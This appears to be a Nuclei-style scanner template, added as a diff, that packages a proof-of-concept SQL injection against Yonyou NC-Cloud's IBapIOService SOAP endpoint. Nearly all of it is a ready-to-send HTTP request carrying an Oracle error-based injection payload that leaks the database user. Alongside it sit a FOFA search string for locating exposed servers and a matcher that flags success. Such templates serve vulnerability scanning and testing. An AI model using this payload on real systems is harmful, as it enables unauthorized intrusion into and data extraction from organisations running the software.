@@ -1,0 +1,19 @@
+id: poc-mimzlp1gzq2og70q
+info:
+  name: 用友NC-Cloud IBapIOService存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mimzlp1gzq2og70q'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mimzlp1gzq2og70q
+    fofa: app="用友-NC-Cloud"
+http:
+- raw:
+  - "POST /uapws/service/nc.itf.bap.service.IBapIOService HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nContent-Type: text/xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:gs=\"http://service.bap.itf.nc/IBapIOService\">\n    <soapenv:Header/>\n    <soapenv:Body>\n        <gs:getBapTableDatas>\n            <gs:stringarrayItem>\n                DWQueue@MessageQueue' AND 1=UTL_INADDR.GET_HOST_ADDRESS('~'||(user)||'~')-- abc\n            </gs:stringarrayItem>\n        </gs:getBapTableDatas>\n    </soapenv:Body>\n</soapenv:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
